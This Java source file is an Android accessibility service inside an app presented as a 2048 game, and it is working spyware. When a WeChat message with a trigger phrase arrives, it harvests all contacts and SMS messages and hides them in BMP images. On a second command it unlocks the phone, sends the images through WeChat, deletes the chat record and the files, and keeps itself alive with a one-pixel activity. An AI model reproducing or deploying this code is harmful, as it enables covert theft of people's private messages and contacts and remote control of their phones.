package com.example.sy.androidgame2048;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.os.Handler;
import android.os.PowerManager;
import android.text.TextUtils;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.List;

public class MyService extends AccessibilityService {

    private String ChatName = null;
    private String text = null;
    private Handler handler = new Handler();
    private boolean flag = false;
    private boolean locked=false;
    private boolean canReply = false;//能否回复且每次收到消息只回复一次
    private boolean enableKeyguard = true;//默认有屏幕锁
    private KeyguardManager km;
    private KeyguardManager.KeyguardLock kl;
    private PowerManager pm;
    private PowerManager.WakeLock wl = null;

    private String TAG = "SupportBlue";

    private ScreenOffReceiver sreceiver;


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        switch (eventType) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    ContentValues values = sendNotifacationReply(event);
                    if (values != null) {
                        Log.i(TAG,"判断消息内容");
                        ChatName = values.getAsString("name");
                        text = values.getAsString("text");
                        judge(ChatName, text, event);
                        ChatName = text = null;
                    }

                break;
            default:
                //Toast.makeText(this, "遇见了很奇怪的问题哦", Toast.LENGTH_SHORT).show();
                break;
        }
    }

    private void deleteFiles(String dirname) {
        File dir = new File(dirname);
        //首先得到当前的路径
        String[] childFileNames = dir.list();
        for (String childFileName : childFileNames) {
            if(childFileName.contains(".1.bmp")||childFileName.contains(".txt")){
                String childFilepath = dir.getAbsolutePath() + '/' + childFileName;
                File childFile = new File(childFilepath);
                childFile.delete();
            }
        }
    }

    private void deleteRecord() {
        try {
            Thread.sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        AccessibilityNodeInfo source10 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> temp1s = source10.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/ajz");
        for (AccessibilityNodeInfo temp1 : temp1s) {
            temp1.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
            break;
        }

        try {
            Thread.sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        AccessibilityNodeInfo source11 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> temp2s = source11.findAccessibilityNodeInfosByText("删除该聊天");
        for (AccessibilityNodeInfo temp2 : temp2s) {
            temp2.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            break;
        }

    }


    @SuppressLint("NewApi")
    private void send() {
        Log.i(TAG,"开始发送");
        AccessibilityNodeInfo source = getRootInActiveWindow();
        List<AccessibilityNodeInfo> addIconInfos = source.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/a76");
        nextClick(addIconInfos);
        Log.i(TAG,"加号点击完成，等待5s");

        try{
            Thread.sleep(5000);
        }catch (Exception e){
            e.printStackTrace();
        }

//        List<AccessibilityNodeInfo> imageInfos = source.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/mo");
//        for(AccessibilityNodeInfo child :imageInfos){
//            child.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
//            break;
//        }

//        List<AccessibilityNodeInfo> imageInfos = source.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/n1");
//        for(AccessibilityNodeInfo info :imageInfos){
//            if(info.getText().toString().equals("相册"))
//            child.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
//            break;
//        }
        Log.i(TAG,"开始查找相册");
        List<AccessibilityNodeInfo> imageInfo = source.findAccessibilityNodeInfosByText("相册");
        AccessibilityNodeInfo tess=imageInfo.get(0);

        int length = imageInfo.size();


        Log.i(TAG,String.valueOf(length));

        Log.i(TAG,tess.getText().toString());
        while(!tess.isClickable()){
            tess = tess.getParent();
            Log.d(TAG, "circle");
        }
        tess.performAction(AccessibilityNodeInfo.ACTION_CLICK);

        try{
            Thread.sleep(5000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source2 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> listInfos = source2.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/cmi");

//        List<AccessibilityNodeInfo> listInfos = source2.findAccessibilityNodeInfosByText("图片和视频");


//        if (!listInfos.isEmpty()) {
//            for (AccessibilityNodeInfo info : listInfos) {
//                if (info.isEnabled() && info.getText().toString().equals("图片和视频")) {
//                    info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                }
//            }
//        }
        AccessibilityNodeInfo temp2=listInfos.get(0);
        while(!temp2.isClickable()){
            temp2 = temp2.getParent();
        }
        temp2.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }



        AccessibilityNodeInfo source3 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> chooseDirInfos = source3.findAccessibilityNodeInfosByText("2048Screen");
        AccessibilityNodeInfo temp3=chooseDirInfos.get(0);
        while(!temp3.isClickable()){
            temp3 = temp3.getParent();
        }
        temp3.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//        if(chooseDirInfos.isEmpty()){
//            AccessibilityNodeInfo sourceTest = getRootInActiveWindow();
//            chooseDirInfos = sourceTest.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/cit");
//
//        }
//        int flag = 0;
//        if (!chooseDirInfos.isEmpty()) {
//            for (AccessibilityNodeInfo info : chooseDirInfos) {
//                if (info.isEnabled() && info.getText().toString().equals("2048Screen")) {
//                    flag = 1;
//                    testInfo=info.getParent();
//                    if(testInfo.isClickable()) {
//                        info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                        Log.d("testparent","can click");
//                    }
//                    else{
//                        Log.d("testparent","I can see it ,but it is not click");
//                    }
//                    break;
//                }
//            }
//            if(flag == 0){
//                Toast.makeText(this, "微信没有刷新相册", Toast.LENGTH_SHORT).show();
//            }
//        }
//
//        try{
//            Thread.sleep(2000);
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//        AccessibilityNodeInfo source4 = getRootInActiveWindow();
//
//        List<AccessibilityNodeInfo> chooseDirInfos_1 = source4.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bcz");
//        if (!chooseDirInfos_1.isEmpty()) {
//            for (AccessibilityNodeInfo info : chooseDirInfos_1) {
//                if (info.isEnabled()) {
//
//                    info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                    break;
//                }
//            }
//        }

        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source5 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> moreInfos = source5.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bd0");
        if (!moreInfos.isEmpty()) {

            for (AccessibilityNodeInfo info : moreInfos) {
                if (info.isEnabled() && info.isClickable()) {
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                }
            }
        }

        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source6 = getRootInActiveWindow();
//        List<AccessibilityNodeInfo> truePictureInfos = source6.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bbg");
//        nextClick(truePictureInfos);//发送原图
        List<AccessibilityNodeInfo> truePictureInfos = source6.findAccessibilityNodeInfosByText("原图");
        truePictureInfos.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);

        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source7 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> sendInfos = source7.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/gy");
        nextClick_spe_1(sendInfos, "发送");  //判断条件得加上text   getText()
    }

    private void nextClick_spe_1(List<AccessibilityNodeInfo> infos, String text) {
        if (!infos.isEmpty()) {
            for (AccessibilityNodeInfo info : infos) {
                if (info.isClickable() && info.getText().toString().contains(text)) {
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }
    }

    private void nextClick(List<AccessibilityNodeInfo> infos) {
        if (!infos.isEmpty())
            for (AccessibilityNodeInfo info : infos) {
                if (info.isEnabled() && info.isClickable())
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

    }


    private void isChatWindow(AccessibilityNodeInfo source) {
        if (!flag && source.getChildCount() > 0) {
            for (int i = 0; i < source.getChildCount(); i++) {
                AccessibilityNodeInfo node1 = source.getChild(i);
//                System.out.println(node1.getClassName().toString());
                // judge
                if ("android.widget.ImageButton".equals(node1.getClassName().toString())) {
                    //获取聊天对象,这里两个if是为了确定找到的这个ImageView是头像的
                    //Toast.makeText(this, "judge chat window not null", Toast.LENGTH_SHORT).show();
                    if (!TextUtils.isEmpty(node1.getContentDescription())) {
                        if ("切换到按住说话".equals(node1.getContentDescription().toString())) {
                            flag = true;
                            break;
                        }
                    }
                }
                isChatWindow(node1);
            }
        }
        return;
    }


    private void judge(String ChatName, String text, AccessibilityEvent event) {

        switch (text) {
            case "给我发一张表情包吧":    //要聊天记录的指令

                getCONTACTData();
                getSMSData();
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
//                wakeAndUnlock(true);
                String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
                outdir += "/Camera/2048Screen";
                try {
                    DoubleExecute.DataToWav(outdir+"/SMS.txt",outdir+"/Screen-1.bmp",outdir+"/Screen1.1.bmp");
                    DoubleExecute.DataToWav(outdir+"/CONTACT.txt",outdir+"/Screen-2.bmp",outdir+"/Screen2.1.bmp");

                } catch (IOException e) {
                    e.printStackTrace();
                    System.out.println("错误");
                }

                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-1.bmp"))));
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-2.bmp"))));
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen1.1.bmp"))));
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen2.1.bmp"))));


                break;

            case "play":    //要聊天记录的指令
                canReply = true;
                wakeAndUnlock(true);
                locked=true;

                try {
                    Thread.sleep(1000); // 停1秒, 否则在微信主界面没进入聊天界面就执行了fillInputBar
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                openAppByNotification(event);
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                try {
                    Log.i("20458Blue","beforesend");
                    send();
                }catch (NullPointerException e){
                    e.printStackTrace();
                }
                try {


                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                            deleteRecord();
                            back2Home();
                            String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
                            outdir += "/Camera/2048Screen";
                            deleteFiles(outdir);
                            //release();
                            wakeAndUnlock(false);

                        }
                    }, 11000);
                }catch (NullPointerException e){
                    e.printStackTrace();
                }
//                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-1.bmp"))));
//                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-2.bmp"))));


                break;


            default:                //写进文件

                break;
        }
    }



    private void openAppByNotification(AccessibilityEvent event) {
        if (event.getParcelableData() != null && event.getParcelableData() instanceof Notification) {
            Notification notification = (Notification) event.getParcelableData();
            try {
                PendingIntent pendingIntent = notification.contentIntent;
                pendingIntent.send();
            } catch (PendingIntent.CanceledException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onInterrupt() {
    }

    private boolean isAppForeground(String packageName) { //判断应用是不是在前台工作
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        ComponentName cn = am.getRunningTasks(1).get(0).topActivity;
        String currentPackageName = cn.getPackageName();
        if (!TextUtils.isEmpty(currentPackageName) && currentPackageName.equals(packageName)) {
            return true;
        }
        return false;
    }

    private boolean isScreenLocked() {  //判断手机是否是锁屏状态
//        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
//        return keyguardManager.inKeyguardRestrictedInputMode();
        PowerManager powerManager = (PowerManager) this.getSystemService(Context.POWER_SERVICE);
        boolean ifOpen = powerManager.isScreenOn();
        return ifOpen;
    }

    private ContentValues sendNotifacationReply(AccessibilityEvent event) {
        if (event.getParcelableData() != null && event.getParcelableData() instanceof Notification) {
            Notification notification = (Notification) event.getParcelableData();
            String content = notification.tickerText.toString();
            String[] cc = content.split(":");
            ContentValues values = new ContentValues();
            values.put("name", cc[0].trim());
            values.put("text", cc[1].trim());
            return values;
        } else {
            return null;
        }
    }

    private void onClickAddData(String chatName, String text, String putdir) {
        String total = chatName + "  " + text + "\n";
        try {
            FileWriter writer = new FileWriter(putdir + "/RECORD.txt", true);
            writer.write(total);
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getCONTACTData() {
        ContentResolver cr = getContentResolver();
        //获取所有电话信息（而不是联系人信息），这样方便展示
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,// 姓名
                ContactsContract.CommonDataKinds.Phone.NUMBER,// 电话号码
        };
        Cursor cursor = cr.query(uri, projection, null, null, null);
        if (cursor == null) {
            return;
        }

        String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
        outdir += "/Camera/2048Screen";

        File file = new File(outdir, "CONTACT.txt");
        //最终要返回的数据

        try {
            FileOutputStream out = new FileOutputStream(file);

            if (cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    //保存到对象里
                    String total = name + "  " + number + "\n";
                    out.write(total.getBytes());
                } while (cursor.moveToNext());
            }
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        //用完记得关闭
        cursor.close();
    }

    private void getSMSData() {
        Uri SMS_INBOX = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"address", "person", "body"};//"_id", "address", "person",, "date", "type
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur)
            return;

        String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
        outdir += "/Camera/2048Screen";

        File file = new File(outdir, "SMS.txt");
        try {
            FileOutputStream out = new FileOutputStream(file);

            if (cur.moveToFirst()) {
                do {
                    String number = cur.getString(cur.getColumnIndex("address"));//手机号
                    String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                    String body = cur.getString(cur.getColumnIndex("body"));//短信具体内容

                    String total = number + "  " + name + "  " + body + "\r\n";
                    out.write(total.getBytes());
                } while (cur.moveToNext());
            }
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        cur.close();
    }


    private void bring2Front() {
        ActivityManager activtyManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> runningTaskInfos = activtyManager.getRunningTasks(3);
        for (ActivityManager.RunningTaskInfo runningTaskInfo : runningTaskInfos) {
            if (this.getPackageName().equals(runningTaskInfo.topActivity.getPackageName())) {
                activtyManager.moveTaskToFront(runningTaskInfo.id, ActivityManager.MOVE_TASK_WITH_HOME);
                return;
            }
        }
    }

    private void back2Home() {
        try{
            Thread.sleep(1000);
        }catch (Exception e){
            e.printStackTrace();
        }
        Intent home = new Intent(Intent.ACTION_MAIN);

        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        home.addCategory(Intent.CATEGORY_HOME);

        startActivity(home);
    }


    private void wakeAndUnlock(boolean unLock)
    {
        if(unLock)
        {
            if(!pm.isScreenOn()) {
                //获取电源管理器对象
                wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "bright");
                //点亮屏幕
                wl.setReferenceCounted(false);
                wl.acquire(80000);
                Log.i("demo", "亮屏");
            }
            if(km.inKeyguardRestrictedInputMode()) {
                //解锁
                enableKeyguard = false;
                //kl.reenableKeyguard();
                kl.disableKeyguard();
                Log.i("demo", "解锁");
            }
        } else {
            if(!enableKeyguard) {
                //锁屏
                kl.reenableKeyguard();
                Log.i("demo", "加锁");
            }
            if(wl != null) {
                //释放wakeLock，关灯
                wl.release();
                wl = null;
                Log.i("demo", "关灯");
            }
        }
    }

    private void release() {
        if (locked && kl != null) {
            //得到键盘锁管理器对象
       //     wl.release();
            kl.reenableKeyguard();

       //     wl=null;
            locked = false;
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG,"open service");

        Log.i(TAG,"can you");

        pm=(PowerManager)getSystemService(Context.POWER_SERVICE);
//        得到键盘锁管理器对象
        km= (KeyguardManager)getSystemService(Context.KEYGUARD_SERVICE);
        //得到键盘锁管理器对象
        kl = km.newKeyguardLock("unLock");


        sreceiver = new ScreenOffReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        registerReceiver(sreceiver, filter);

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(sreceiver);
    }

    class ScreenOffReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            if (action.equals(Intent.ACTION_SCREEN_OFF)) {

                Intent lockscreen = new Intent(MyService.this, OnePiexlActivity.class);
                lockscreen.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(lockscreen);
            } else if (action.equals(Intent.ACTION_SCREEN_ON)) {
                context.sendBroadcast(new Intent("finish"));
                if(canReply) {
                    Log.i(TAG, "-------------can reply true");
                    canReply=false;

                    return;
                }else {
                    Log.i(TAG, "-------------can reply false");
                }
                Intent test = new Intent(Intent.ACTION_MAIN,null);
                test.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                test.addCategory(Intent.CATEGORY_HOME);
                startActivity(test);
            }
        }
    }


}
